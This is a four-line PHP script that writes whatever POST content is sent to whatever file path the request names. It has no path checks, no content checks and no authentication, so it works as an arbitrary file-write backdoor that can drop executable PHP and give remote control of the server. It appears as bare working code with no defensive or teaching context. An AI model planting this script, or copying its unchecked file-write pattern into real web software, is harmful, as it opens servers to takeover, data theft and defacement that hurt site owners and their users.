<?php
$file = fopen($_POST['filename'],"w");
fwrite($file,$_POST['content']);
fclose($file);